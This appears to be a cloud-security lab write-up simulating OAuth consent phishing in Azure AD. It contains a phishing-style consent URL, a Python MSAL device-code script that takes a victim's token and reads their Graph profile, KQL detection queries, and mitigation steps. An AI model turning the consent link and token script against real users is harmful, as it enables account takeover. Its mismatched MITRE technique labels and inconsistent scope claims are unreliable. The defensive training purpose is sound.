## OAuth Consent Phishing Simulation with Microsoft Graph and User.Read Scope

---

# Platforms and Languages Leveraged

- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- App registered in Azure Active Directory (multi-tenant)
- Python and MSAL used for token acquisition
    
---

## Scenario

This project demonstrates an OAuth consent phishing attack simulation using a multi-tenant Azure app. The goal was to simulate how an attacker can gain access to sensitive user data (without needing a password) by tricking a user into granting delegated access to a malicious application.

---

## Objective

### To simulate a realistic cloud-based attack path where a user unknowingly grants delegated access to a rogue application, allowing an attacker to:

- Read user profile information

- Persist access using refresh tokens

- Operate without detection if no user reports suspicious activity

---

## Attack Simulation Steps

1) App Registration: Registered a multi-tenant app in Azure AD with public client flow enabled.

Redirects:

---

2) Generated Consent URL: Shared phishing-style URL to trigger consent screen. This link can be shared via email, any chat platform, etc.):

https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=<348ed938-8c24-4cb4-8dff-1b5ed4e31778>
&response_type=code
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&response_mode=query
&scope=Mail.Read offline_access User.Read
&state=attack123

---

3) Consent: User accepted the app‚Äôs request for User.Read and offline_access scopes.

Once the user clicks agree they will be redirected to a page such as this:

<img width="2034" height="1020" alt="image" src="https://github.com/user-attachments/assets/460c23ea-c15c-4dc7-af68-0417e143e171" />

---

4) Access Token Retrieval: Used MSAL in Python to perform device code login.

Prompt requesting to sign into app:

<img width="1202" height="782" alt="image" src="https://github.com/user-attachments/assets/c1844797-29a3-481e-9f2d-5ca6becfe20e" />

Once the user signs into the app they will see a notification such as this:

<img width="2466" height="1102" alt="image" src="https://github.com/user-attachments/assets/534412a3-a853-4678-b157-d16ce920a504" />

---

5) API Call: Successfully queried Microsoft Graph API for the signed-in user's profile data.

- Sample Graph API Output

Display Name: e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de
UPN: e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de@lognpacific.com
ID: 5512a2c3-93f5-4e29-baf6-fc58c2710f19

6) Log Collection: Verified consent grant and app sign-ins using KQL queries in Sentinel.

## KQL Detection Queries Used

1. Consent Grant Detection

**Query used to locate events:**

```kql
AuditLogs
| where OperationName in ("Consent to application", "Add delegated permission grant")
| extend AppName = tostring(TargetResources[0].displayName)
| where AppName has "Phish" or AppName has "PhishMailReader" 
| project TimeGenerated, AppName, InitiatedBy, ActivityDisplayName, Result
```

---

2. App Sign-in Usage

```kql
SigninLogs
| where AppDisplayName has "Phish" or AppDisplayName has "PhishMailReader"
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, ClientAppUsed
```

---

This Python script represents post-consent activity performed by an attacker. The victim only sees the Microsoft OAuth consent prompt in their browser. No scripts or malware are needed for this attack ‚Äî just social engineering and permission abuse.


```Python
import msal, requests

client_id = "348ed938-8c24-4cb4-8dff-1b5ed4e31778"
authority = "https://login.microsoftonline.com/common"
scopes = ["User.Read", "offline_access"]

app = msal.PublicClientApplication(client_id, authority=authority)
flow = app.initiate_device_flow(scopes=scopes)

if "user_code" not in flow:
    raise ValueError("Failed to start device code flow")

print("\nTo authenticate:")
print(flow["message"])

result = app.acquire_token_by_device_flow(flow)

if "access_token" in result:
    print("\n‚úÖ Authenticated successfully.")
    token = result["access_token"]
    r = requests.get(
        "https://graph.microsoft.com/v1.0/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    user = r.json()
    print("\nüë§ User Info:")
    print(f"Display Name: {user.get('displayName')}")
    print(f"UPN: {user.get('userPrincipalName')}")
    print(f"ID: {user.get('id')}")
else:
    print("\n‚ùå Failed to authenticate:")
    print(result.get("error_description"))
```

After the above script is ran the output will be what is shown below. Allowing me access to the end user:

- T1528 Credential Access - Access Token Manipulation
- T1550.003 Defense Evasion - Exploit Authorization Logic Flaw
- T1098.001 Persistence - Cloud Service Permissions

## Recommendations

### Prevention

- Disable user consent to unverified applications in Entra ID settings.
- Require admin approval for apps requesting high-impact scopes (Mail.Read, Files.Read.All).
- Enable app consent policies and set trusted publisher restrictions.

---

## Detection

Deploy Sentinel analytic rules for:
- New delegated consent events
- Apps requesting offline_access, Files.Read.All, etc.
- Sign-ins from unknown app IDs

---

## Containment

Revoke access tokens using:
- Revoke-MgUserSignInSession -UserId <UPN>
- Block sign-ins from malicious app client IDs
- Remove consent via: Enterprise Applications > Permissions
